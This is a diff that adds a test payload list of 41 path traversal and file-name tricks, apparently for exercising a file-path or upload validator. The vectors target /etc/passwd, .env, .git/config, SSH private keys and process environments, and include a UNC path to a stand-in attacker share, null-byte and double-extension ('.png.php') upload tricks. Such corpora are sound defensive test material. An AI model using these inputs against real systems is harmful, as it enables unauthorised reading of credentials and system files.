@@ -1,0 +1,45 @@
+# payload-list-version: 1.0.0
+# Path traversal and file-name tricks (Session 16, doc 07 section 4.7). Hand-curated; one vector per line;
+# `json:` lines hold a JSON string literal; `#` lines are comments.
+# count: 41
+../
+../../
+../../../../etc/passwd
+..\..\..\windows\win.ini
+....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%c0%af..%c0%afetc%c0%afpasswd
+..%5c..%5cwindows%5cwin.ini
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+\\attacker\share\x
+file:///etc/passwd
+reports/../../.env
+support/../reports/x.pdf
+support/..%2f..%2f.env
+./.env
+.env
+.git/config
+var/storage/../../.env
+/proc/self/environ
+/dev/random
+reports/%00.pdf
+json:"reports/x\u0000.pdf"
+json:"..\u2215..\u2215etc\u2215passwd"
+json:"\uff0e\uff0e\uff0fetc\uff0fpasswd"
+..;/..;/etc/passwd
+....\\....\\windows
+%252e%252e%252f
+..//..//..//etc//passwd
+/.././.././etc/passwd
+~/.ssh/id_rsa
+CON
+NUL.png
+aux.jpg
+shot.png.php
+shot.php%00.png
+shot.png/
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
